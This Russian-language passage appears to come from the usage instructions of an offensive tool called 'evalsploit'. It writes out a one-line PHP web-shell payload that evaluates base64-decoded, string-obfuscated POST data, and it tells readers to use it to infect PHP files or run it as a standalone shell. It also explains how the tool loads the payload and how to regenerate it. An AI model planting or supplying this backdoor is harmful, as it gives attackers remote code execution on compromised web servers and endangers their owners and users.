...
1) Используйте пейлоад `if(isset($_POST['Z'])){@eval(base64_decode(str_replace($_POST['V'], '' ,$_POST['Z'])));die();}` для заражения PHP или как самостоятельный шелл.
2) При запуске программы evalsploit потребует ссылку на файл с пейлоадом
3) При изменении модуля `send` (см. "надстройка программы") используйте команду `gen` для генерации нового пейлоада
